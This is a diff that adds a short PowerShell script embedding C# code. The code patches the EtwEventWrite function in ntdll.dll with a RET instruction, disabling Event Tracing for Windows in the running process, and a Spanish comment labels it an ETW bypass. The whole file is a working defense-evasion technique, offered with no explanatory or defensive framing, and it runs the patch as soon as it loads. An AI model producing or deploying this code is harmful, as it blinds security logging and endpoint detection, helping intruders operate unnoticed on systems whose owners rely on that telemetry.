@@ -1,0 +1,47 @@
+#disable etw powershell
+
+function Patch-Etw {
+    $etwPatch = @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+public class EtwPatcher
+{
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
+
+    public static void PatchEtwEventWrite()
+    {
+        const uint PAGE_EXECUTE_READWRITE = 0x40;
+        string ntdllModuleName = "ntdll.dll";
+        string etwEventWriteFunctionName = "EtwEventWrite";
+
+        IntPtr ntdllModuleHandle = GetModuleHandle(ntdllModuleName);
+        IntPtr etwEventWriteAddress = GetProcAddress(ntdllModuleHandle, etwEventWriteFunctionName);
+
+        byte[] retOpcode = { 0xC3 }; // RET opcode
+
+        uint oldProtect;
+        VirtualProtect(etwEventWriteAddress, (UIntPtr)retOpcode.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+
+        int bytesWritten;
+        WriteProcessMemory(Process.GetCurrentProcess().Handle, etwEventWriteAddress, retOpcode, (uint)retOpcode.Length, out bytesWritten);
+    }
+}
+"@
+    Add-Type -TypeDefinition $etwPatch -Language CSharp
+    [EtwPatcher]::PatchEtwEventWrite()
+}
+
+# Ejecutar el bypass de ETW
+Patch-Etw
